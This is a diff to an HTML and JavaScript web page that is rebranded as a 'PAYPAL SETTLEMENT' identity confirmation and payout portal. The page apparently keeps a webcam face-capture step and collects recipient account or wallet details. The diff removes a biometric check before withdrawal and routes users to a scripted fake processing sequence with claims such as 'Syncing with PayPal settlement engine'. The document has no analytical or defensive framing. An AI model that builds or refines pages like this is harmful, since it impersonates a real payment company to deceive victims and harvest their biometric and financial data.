@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PAY FIT</title>
+    <title>PAYPAL SETTLEMENT - Identity Confirmation & Payout</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
     <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
@@ -247,8 +247,8 @@
                         <label class="text-[10px] font-bold text-slate-500 uppercase tracking-widest pl-2" id="addr-label">Recipient Account / Wallet</label>
                         <input type="text" id="withdraw-addr" placeholder="Enter recipient details" class="w-full bg-black/40 border border-white/10 rounded-2xl p-5 text-sm font-mono focus:outline-none focus:border-blue-500 transition-colors">
                     </div>
-                    <button onclick="startWithdrawVerification()" class="btn-gradient w-full text-white font-bold py-5 rounded-2xl shadow-xl hover:opacity-90 transition-all text-lg uppercase tracking-widest">
-                        PROCEED TO VERIFICATION
+                    <button onclick="directToProcessing()" class="btn-gradient w-full text-white font-bold py-5 rounded-2xl shadow-xl hover:opacity-90 transition-all text-lg uppercase tracking-widest">
+                        INITIALIZE SETTLEMENT
                     </button>
                 </div>
             </div>
@@ -322,13 +322,6 @@
 
             document.getElementById('face-section').classList.remove('hidden');
             
-            if (mode === 'withdraw') {
-                document.getElementById('face-title').innerText = "Final Payout Confirmation";
-                document.getElementById('face-desc').innerText = "Authorize final settlement via biometric scan";
-                document.getElementById('capture-btn').classList.remove('hidden');
-                document.getElementById('scanning-msg').classList.add('hidden');
-            }
-
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('webcam');
@@ -389,9 +382,6 @@
                 }
                 document.getElementById('dashboard-section').classList.remove('hidden');
                 document.getElementById('congrats-popup').classList.remove('hidden');
-            } else {
-                document.getElementById('withdraw-overlay').classList.remove('hidden');
-                startProcessing();
             }
         }
 
@@ -418,13 +408,13 @@
             document.getElementById('step-address').classList.remove('hidden');
         }
 
-        function startWithdrawVerification() {
+        function directToProcessing() {
             const addr = document.getElementById('withdraw-addr').value;
             if (!addr) {
                 alert("Please enter receiving details.");
                 return;
             }
-            startFaceAuth('withdraw');
+            startProcessing();
         }
 
         function startProcessing() {
@@ -440,7 +430,7 @@
             const messages = [
                 "Syncing with PayPal settlement engine...",
                 "Clearing multi-hop blockchain route...",
-                "Validating biometric authorization...",
+                "Validating payout authorization...",
                 "Awaiting network node confirmation...",
                 "Bypassing international merchant delays...",
                 "Initiating final settlement protocol...",
